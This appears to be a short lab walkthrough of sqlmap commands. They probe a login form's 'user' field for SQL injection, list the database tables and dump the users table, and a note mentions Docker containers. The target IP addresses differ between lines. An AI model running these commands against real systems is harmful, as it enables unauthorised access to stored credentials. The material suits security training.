#Get Information and Enumerate, is the host vulnerable?
sqlmap -u "http://35.89.204.101:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST

# Yep!  Let's list the tables
sqlmap -u "http://35.24.89.206:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST --tables

#Now that we know the table names, we can dump data.  Let's dump the users table.
sqlmap -u "http://35.24.114.101:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST --dump -T users

# NOTE: If you are running sqlmap in a virtual machine and the Docker containers are running on the host OS you
#       will need to replace the IP address with your host machine's IP.

